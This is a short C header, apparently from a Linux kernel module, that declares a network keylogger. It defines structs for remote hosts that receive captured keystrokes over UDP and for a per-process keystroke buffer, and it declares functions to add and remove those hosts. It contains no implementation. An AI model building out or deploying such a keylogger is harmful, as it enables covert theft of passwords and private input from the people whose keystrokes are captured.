#ifndef KEYLOGGER
#define KEYLOGGER

#include "include.h"

#include <linux/fs.h>
#include <linux/in.h>
#include <linux/string.h>
#include <linux/uaccess.h>
#include <linux/mutex.h>

/* struct for our hosts to receive keylogs */
struct host_node {
	struct socket *sock;
	struct sockaddr_in addr;
};

/* struct for current task buffer */
struct buff_node {
	int pid;
	char udp_buffer[UDP_BUFF];
	int index;
};

void insert_host(struct sockaddr_in *addr);
void remove_host(struct sockaddr_in *addr);

int network_keylogger_init(void);
void network_keylogger_exit(void);

#endif